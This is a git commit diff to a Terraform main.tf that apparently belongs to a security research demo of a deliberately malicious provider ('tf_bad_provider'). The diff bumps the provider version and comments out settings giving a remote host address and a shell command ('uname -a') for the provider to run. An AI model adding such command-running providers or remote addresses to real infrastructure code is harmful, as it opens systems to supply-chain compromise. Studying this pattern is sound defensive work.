80eeb83304dd898726dad5938acc81abc7cbf979
Mathieu Deous <mathieu.deous@datadoghq.com>
2025-02-13 16:56:12 +0100

    update example

--- main.tf
+++ main.tf
@@ -2,14 +2,14 @@ terraform {
   required_providers {
     tf_bad_provider = {
       source  = "mdeous-datadog/tf-bad-provider"
-      version = "1.0.0"
+      version = "1.0.8"
     }
   }
 }
 
 provider "tf_bad_provider" {
-  address = "toolbox.p.ddtdg.com:4400"
-  command = "uname -a"
+  # address = "toolbox.p.ddtdg.com:4400"
+  # command = "uname -a"
 }
 
 resource "dummy_resource" "p" {}
